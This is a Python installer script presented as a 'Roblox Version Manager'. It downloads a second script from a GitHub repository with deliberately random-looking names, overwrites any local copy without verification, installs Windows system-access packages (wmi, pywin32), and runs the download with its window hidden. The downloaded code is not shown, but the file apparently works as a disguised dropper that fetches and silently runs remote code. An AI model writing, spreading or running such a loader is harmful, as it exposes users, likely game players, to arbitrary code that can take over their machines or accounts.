#!/usr/bin/env python3
"""
DRCM - Roblox Version Manager
Created by: Dev_Z / ipad_halobuck
"""

import os
import sys
import subprocess
import shutil
import platform
from pathlib import Path

def main():
    print("=" * 50)
    print("         DRCM - Roblox Manager")
    print("=" * 50)
    print()
    print("         Created by: Dev_Z / ipad_halobuck")
    print()
    print("=" * 50)
    print()

    # Get user's home directory
    user_home = Path.home()
    downloads_dir = user_home / "Downloads"
    drcm_dir = downloads_dir / "Drcm"
    drcm_script = drcm_dir / "drcm.py"
    version_file = drcm_dir / "version.txt"

    # GitHub URLs
    github_base = "https://raw.githubusercontent.com/jfs8u7ahfa8ufhafaiohff5435dsg8778633328/fsa8fhafiahfa-98fahf9apufhaofhf8s-9afhagf09-aff98asyfa09f8ayfa09ff8yaf908a7ftasfghas908fagthy4sgy5-_/refs/heads/main"
    github_script_url = f"{github_base}/drcm.py"
    github_version_url = f"{github_base}/version.txt"

    # Check if Python is installed
    print("[1/5] Checking Python installation...")
    try:
        subprocess.run([sys.executable, "--version"], capture_output=True, check=True)
        print("        Python is ready")
    except:
        print("        Python is not installed!")
        print("        Please install Python 3.8 or higher from python.org")
        input("Press Enter to exit...")
        return

    # Get Python version
    result = subprocess.run([sys.executable, "--version"], capture_output=True, text=True)
    print(f"        Version: {result.stdout.strip()}")
    print()

    # Create directory if needed
    print("[2/5] Setting up DRCM folder...")
    drcm_dir.mkdir(parents=True, exist_ok=True)
    print(f"        Folder: {drcm_dir}")
    print()

    # Check for updates
    print("[3/5] Checking for updates...")
    print()

    # Get remote version
    import urllib.request
    import json
    import base64
    
    remote_version = "1.0.0"
    try:
        req = urllib.request.Request(github_version_url)
        with urllib.request.urlopen(req, timeout=10) as response:
            remote_version = response.read().decode().strip()
        print(f"        Remote version: {remote_version}")
    except:
        print(f"        Could not check version, using default")
    
    # Check local version
    local_version = ""
    if version_file.exists():
        with open(version_file, 'r') as f:
            local_version = f.read().strip()
        print(f"        Local version: {local_version}")
    else:
        print("        No local version found")
    
    print()

    # Always remove old script and download fresh
    print("        Removing old version...")
    if drcm_script.exists():
        drcm_script.unlink()
        print("        Old script removed.")
    else:
        print("        No existing script found.")
    
    print()
    print(f"        Downloading latest version {remote_version}...")
    
    try:
        req = urllib.request.Request(github_script_url)
        with urllib.request.urlopen(req, timeout=30) as response:
            with open(drcm_script, 'wb') as f:
                f.write(response.read())
        with open(version_file, 'w') as f:
            f.write(remote_version)
        print(f"        Download successful! Version {remote_version} installed.")
    except Exception as e:
        print(f"        Download failed: {e}")
        input("Press Enter to exit...")
        return

    print()
    print("[4/5] Installing required packages...")
    print()

    # Install required packages
    packages = ['PySide6', 'requests', 'wmi', 'pywin32']
    for pkg in packages:
        try:
            __import__(pkg.lower().replace('-', '_'))
            print(f"        {pkg} already installed")
        except ImportError:
            print(f"        Installing {pkg}...")
            subprocess.run([sys.executable, "-m", "pip", "install", pkg, "-q"], capture_output=True)

    print()
    print("[5/5] Creating folders...")
    print()

    # Create necessary folders
    folders = ['RbxV', 'dt/dt', 'nt/nt', 'ct', 'Settings', 'Sounds']
    for folder in folders:
        folder_path = drcm_dir / folder
        folder_path.mkdir(parents=True, exist_ok=True)
    
    print("        All folders ready.")
    print()
    print("=" * 50)
    print("    Setup Complete!")
    print("=" * 50)
    print()

    # Display current version
    if version_file.exists():
        with open(version_file, 'r') as f:
            current_version = f.read().strip()
        print(f"DRCM Version: {current_version}")
    else:
        print("DRCM Version: 1.0.0")
    print()
    print("Starting DRCM...")
    print()

    # Launch DRCM
    if drcm_script.exists():
        subprocess.Popen([sys.executable, str(drcm_script)], creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0)
    else:
        print(f"ERROR: DRCM not found at: {drcm_script}")
        input("Press Enter to exit...")

if __name__ == "__main__":
    main()
